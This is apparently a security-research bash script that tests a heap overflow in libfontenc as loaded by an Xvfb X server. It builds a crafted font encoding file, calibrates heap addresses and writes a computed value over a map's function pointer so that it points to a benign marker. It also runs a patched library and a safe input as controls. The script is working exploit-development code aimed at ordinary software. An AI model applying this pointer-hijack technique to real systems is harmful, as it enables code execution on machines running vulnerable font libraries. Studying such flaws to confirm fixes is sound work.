#!/bin/bash
# W189 test-only experiment: put the buffer-allocating code in mapping 1 so the
# first `cmap 3 1` map (mapping 2) is allocated AFTER the 131072-byte buffer.
# W187/W188 observed libXfont2 recoding the first cmap map (m1), which was
# allocated before the buffer, so the hijacked pointer was never invoked.
# This script asks whether allocation order, not charset, decides the target.
set -u
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
BASE=$(CDPATH= cd -- "$HERE/../.." && pwd)
TMP="$BASE/realpath/tmp/xfptr-reorder"
OUT="$BASE/realpath/evidence/xfptr/reorder"
FONTS="$TMP/fonts"
VULN="$BASE/build-vuln/out-plain/libfontenc.so.1.0.0"
FIXED="$BASE/build-fixed/out-plain/libfontenc.so.1.0.0"
XLFD='-urw-nimbus mono ps-regular-r-normal--0-0-0-0-p-0-crafted-1'
mkdir -p "$FONTS" "$OUT"
cc -shared -fPIC -O0 -g -I"$BASE/src" -o "$TMP/interpose.so" "$HERE/interpose.c" -ldl

DECOYS=8   # mappings 3..10; word mappings 11..14
# $1 rows; $2..$5 from values; $6..$9 hex words (without 0x)
write_enc() {
    local rows=$1 f0=$2 f1=$3 f2=$4 f3=$5 w0=$6 w1=$7 w2=$8 w3=$9
    local i
    {
    printf 'STARTENCODING crafted-1\nSIZE 256 %s\n' "$rows"
    # Mapping 1: non-identity high code allocates the encoding buffer here.
    printf 'STARTMAPPING unicode\n0xff00 0x1111\nENDMAPPING\n'
    # Mapping 2: the only cmap map. W187/W188 saw recode called on the first
    # cmap map; here it is allocated after the buffer.
    printf 'STARTMAPPING cmap 3 1\n0x0000 0x0001\nENDMAPPING\n'
    for ((i=3; i<=DECOYS; i++)); do
        printf 'STARTMAPPING unicode\n0x0000 0x0001\nENDMAPPING\n'
    done
    printf 'STARTMAPPING unicode\n%s 0x%s\nENDMAPPING\n' "$f0" "$w0"
    printf 'STARTMAPPING unicode\n%s 0x%s\nENDMAPPING\n' "$f1" "$w1"
    printf 'STARTMAPPING unicode\n%s 0x%s\nENDMAPPING\n' "$f2" "$w2"
    printf 'STARTMAPPING unicode\n%s 0x%s\nENDMAPPING\n' "$f3" "$w3"
    printf 'ENDENCODING\n'
    } > "$FONTS/crafted-1.enc"
}

prep_fonts() {
    cp "$HERE/type1fonts/NimbusMonoPS-Regular.pfb" "$HERE/type1fonts/fonts.dir" \
       "$HERE/type1fonts/encodings.dir" "$FONTS/"
}
start_xvfb() { # lib disp
    MALLOC_MMAP_THRESHOLD_=262144 LD_PRELOAD="$TMP/interpose.so:$1" \
      setarch x86_64 -R Xvfb ":$2" -screen 0 640x480x24 -nolisten tcp \
      -noreset -fp "$FONTS" > "$TMP/$2.xvfb.log" 2>&1 &
    echo $!
}
load_font() { DISPLAY=":$1" "$HERE/xfon-load" ":$1" "$XLFD" > "$TMP/$1.client" 2>&1 || true; sleep 1; }
stop_xvfb() { kill "$1" 2>/dev/null || true; wait "$1" 2>/dev/null || true; }
hex() { echo "$((16#${1#0x}))"; }

# Phase 1: in-bounds calibration. Read the buffer base, the first map above it
# and the benign marker address.
prep_fonts
write_enc 256 0xfe24 0xfe25 0xfe26 0xfe27 9159 f7fb 7fff 0000
pid=$(start_xvfb "$VULN" 1620); sleep 3; load_font 1620; stop_xvfb "$pid"
cal="$TMP/cal.txt"
grep -E 'LF_MARKER_ADDR|LF_BUF|LF_FIND_MAP n=' "$TMP/1620.xvfb.log" > "$cal"
buf=$(grep 'LF_BUF' "$cal" | head -1 | sed -E 's/.*=//')
target=
targetn=
while read -r n m; do
    case "$n" in ''|*[!0-9]*) continue;; esac
    [ "$n" -ge 2 ] || continue
    if [ -n "$m" ] && [ "$(hex "$m")" -gt "$(hex "$buf")" ]; then
        target=$m; targetn=$n; break
    fi
done < <(sed -nE 's/.*LF_FIND_MAP n=([0-9]+) m=([^ ]+).*/\1 \2/p' "$cal")
marker=$(grep 'LF_MARKER_ADDR' "$cal" | tail -1 | sed -E 's/.*=//')
if [ -z "$buf" ] || [ -z "$target" ] || [ -z "$marker" ] || [ -z "$targetn" ]; then
    echo 'CALIBRATION FAILED' | tee "$OUT/matrix.txt"; cp "$cal" "$OUT/cal.txt"; exit 2
fi
if [ "$targetn" -gt "$DECOYS" ]; then
    echo "TARGET n$targetn NOT BEFORE WORD WRITES (DECOYS=$DECOYS)" \
      | tee "$OUT/matrix.txt"; cp "$cal" "$OUT/cal.txt"; exit 2
fi
idx=$(( ( $(hex "$target") + 0x10 - $(hex "$buf") ) / 2 ))
base=$(( (idx / 258) * 256 + idx % 258 ))
wm=$(hex "$marker")
set -- $(printf '0x%x ' $((base)) $((base+1)) $((base+2)) $((base+3))) \
       $(printf '%04x %04x %04x %04x' $((wm & 0xffff)) $(((wm >> 16) & 0xffff)) \
         $(((wm >> 32) & 0xffff)) $(((wm >> 48) & 0xffff)))
F0=$1; F1=$2; F2=$3; F3=$4; W0=$5; W1=$6; W2=$7; W3=$8
printf 'buffer=%s target=n%s m=%s marker=%s idx=%s from=%s %s %s %s words=%s %s %s %s\n' \
    "$buf" "$targetn" "$target" "$marker" "$idx" "$F0" "$F1" "$F2" "$F3" "$W0" "$W1" "$W2" "$W3" \
    | tee "$OUT/matrix.txt"
cp "$cal" "$OUT/cal.txt"

# Phase 2: crafted (vulnerable twice), safe-input and fixed controls.
run_case() { # tag lib rows disp
    tag=$1; lib=$2; rows=$3; disp=$4
    [ -f "$lib" ] || { echo "MISSING LIB $lib" >&2; exit 2; }
    prep_fonts
    write_enc "$rows" "$F0" "$F1" "$F2" "$F3" "$W0" "$W1" "$W2" "$W3"
    pid=$(start_xvfb "$lib" "$disp"); sleep 3; load_font "$disp"; stop_xvfb "$pid"
    log="$TMP/$disp.xvfb.log"
    {
        echo "# $tag — filtered distinctive lines from raw Xvfb stderr"
        echo "# recode_call_count=$(grep -c LF_RECODE_MAP "$log")"
        echo "# marker_call_count=$(grep -c LF_XVFB_MARKER "$log")"
        grep -E 'LF_MARKER_ADDR|LF_BUF|LF_FIND charset|LF_FIND_MAP|LF_RECODE_MAP|LF_XVFB_MARKER' "$log" | sort -u
        grep -iE 'error|fatal|abort|segfault' "$log" | sort -u | head -5
    } > "$OUT/$tag.xvfb.txt"
    tr=$(grep "LF_FIND_MAP n=$targetn" "$log" | tail -1 | sed -E 's/.*recode=//')
    rc=$(grep 'LF_RECODE_MAP' "$log" | sed -E 's/.*=//' | sort -u | tr '\n' ',')
    printf '%s marker_calls=%s target_recode=%s recode_targets=%s\n' \
        "$tag" "$(grep -c LF_XVFB_MARKER "$log" || true)" "$tr" "$rc" \
        | tee -a "$OUT/matrix.txt"
}
run_case vuln-crafted-a "$VULN" 258 1621
run_case vuln-crafted-b "$VULN" 258 1622
run_case vuln-safe "$VULN" 256 1623
run_case fixed-crafted "$FIXED" 258 1624
